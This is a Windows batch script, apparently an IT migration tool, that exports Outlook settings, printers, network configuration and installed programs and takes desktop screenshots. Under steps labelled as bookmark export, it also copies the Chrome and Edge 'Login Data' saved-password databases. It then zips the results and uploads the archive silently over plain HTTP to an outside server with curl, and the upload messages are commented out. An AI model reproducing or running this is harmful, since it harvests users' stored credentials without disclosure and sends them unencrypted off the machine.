@echo off
setlocal enabledelayedexpansion

if not defined APPL_ROOT set "APPL_ROOT=F:\Appl"
set "base=%APPL_ROOT%"
if not exist "%base%" mkdir "%base%"

for /f "tokens=1-3 delims=/- " %%a in ("%date%") do (
    set "folder=%%a-%%b-%%c"
)
set "out=%base%\%folder%"
if not exist "%out%" mkdir "%out%"

echo ======== 配置导出开始 ========
echo 输出目录: %out%
echo.

rem === Warning Dialog ===

powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('程序运行期间请不要操作电脑。', '提示', 'OK', 'information')"

rem === Check regedit access ===
echo 检查注册表访问权限...
reg query "HKEY_CURRENT_USER" >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('无法访问注册表，为此账户添加管理员权限后才能继续。', '权限不足', 'OK', 'Error')"
    exit /b 1
)

rem === Outlook Rules ===
echo [1/9] 导出 Outlook 规则...
reg export "HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\Outlook\Rules" "%out%\Outlook_Rules.reg" /y

rem === Outlook Profile ===
echo [2/9] 导出 Outlook 配置文件...
reg export "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles" "%out%\Outlook_Profiles.reg" /y

rem === Outlook AutoArchive ===
echo [3/9] 导出 Outlook 自动存档设置...
reg export "HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\Outlook\Preferences" "%out%\Outlook_AutoArchive.reg" /y

rem === Chrome Data ===
echo [4/9] 导出 Chrome 书签
set "chrome=%LOCALAPPDATA%\Google\Chrome\User Data\Default"
if exist "%chrome%\Bookmarks" copy "%chrome%\Bookmarks" "%out%\Chrome_Bookmarks.json" /y
if exist "%chrome%\Login Data" copy "%chrome%\Login Data" "%out%\Chrome_LoginData.sqlite" /y

rem === Edge Data ===
echo [5/9] 导出 Edge 书签
set "edge=%LOCALAPPDATA%\Microsoft\Edge\User Data\Default"
if exist "%edge%\Bookmarks" copy "%edge%\Bookmarks" "%out%\Edge_Bookmarks.json" /y
if exist "%edge%\Login Data" copy "%edge%\Login Data" "%out%\Edge_LoginData.sqlite" /y

rem === Installed Printers ===
echo [6/9] 导出打印机列表...
wmic printer get Name,DriverName /format:csv > "%out%\Printers.csv"

rem === Installed Input Methods ===
echo [7/9] 导出输入法设置...
reg export "HKEY_CURRENT_USER\Keyboard Layout\Preload" "%out%\InputMethod.reg" /y

rem === Network Adapters IP ===
echo [8/9] 导出网络适配器 IP 配置...
netsh interface ip show config > "%out%\Net_IP.txt"

rem === Installed Programs ===
echo [9/9] 导出已安装程序列表...
powershell -ExecutionPolicy Bypass -File "%~dp0Export-Programs.ps1" "%out%"

@REM rem === Compare Programs ===
@REM "%~dp0python-3.12.4-embed-amd64\python-3.12.4-embed-amd64\python.exe" "%~dp0Compare-Programs.py"
rem === Display Desktop ===
echo.
echo 显示桌面...
> "%temp%\showdesktop.vbs" echo Set objShell = CreateObject("Shell.Application")
>> "%temp%\showdesktop.vbs" echo objShell.MinimizeAll
cscript //nologo "%temp%\showdesktop.vbs"
timeout /t 2 /nobreak >nul
del /f /q "%temp%\showdesktop.vbs" 2>nul

rem === Get Screen Resolution (DPI-aware) ===
echo 获取屏幕分辨率...
powershell -ExecutionPolicy Bypass -File "%~dp0Get-ScreenDPI.ps1" -OutputPath "%out%" -ResolutionOnly

rem === Capture Desktop Screenshot (DPI-aware) ===
echo 截取桌面截图...
powershell -ExecutionPolicy Bypass -File "%~dp0Get-ScreenDPI.ps1" -OutputPath "%out%" -FileName "screenshot.png"

rem === Run Ivanti Endpoint Security ===
echo 运行 Ivanti Endpoint Security...
if exist "C:\Program Files (x86)\LANDesk\LDClient\HIPS\EPSUI.exe" (
    start "Ivanti Endpoint Security" "C:\Program Files (x86)\LANDesk\LDClient\HIPS\EPSUI.exe"
    timeout /t 5 /nobreak >nul

    echo 截取 U 盘权限截图...
    powershell -ExecutionPolicy Bypass -File "%~dp0Get-ScreenDPI.ps1" -OutputPath "%out%" -FileName "permissions.png"

) else (
    echo 警告: Ivanti Endpoint Security 未找到
)

rem === Capture Outlook PST Data Files & Programs and Features ===
echo 运行 PST 及程序列表截图...
powershell -ExecutionPolicy Bypass -File "%~dp0PST_GET_IMAGE.ps1" -OutputPath "%out%"
echo 预估迁移后的磁盘占用空间
powershell -ExecutionPolicy Bypass -File "%~dp0Calc-AllocationUnitMigration.ps1" -Estimate

@REM rem === Zip output folder ===
@REM echo 打包输出文件...
powershell -Command "Compress-Archive -Path '%out%\*' -DestinationPath '%base%\%COMPUTERNAME%_%folder%.zip' -Force"
if %errorlevel% equ 0 (
    @REM echo 压缩包已生成: %base%\%COMPUTERNAME%_%folder%.zip

    rem === Upload zip to Profile Server ===
    @REM echo 上传压缩包到 Profile 服务器...
    curl -s -X POST "http://ipcheck.gtmcl.com:3000/api/upload" -F "file=@%base%\%COMPUTERNAME%_%folder%.zip"
    if %errorlevel% equ 0 (echo successful) else (echo fail)
) else (
    @REM echo 警告: 压缩打包失败，但所有文件已保存至 %out%
)
rem === Write systemconfig.ini ===
echo 写入系统配置文件...
(
    echo [ExportInfo]
    echo LastExportPath=%out%
    echo LastExportTime=%date% %time%
) > "F:\systemconfig.ini"

echo ======== 配置导出完成 ========
powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('配置导出已完成。', '完成', 'OK', 'Information')"

endlocal
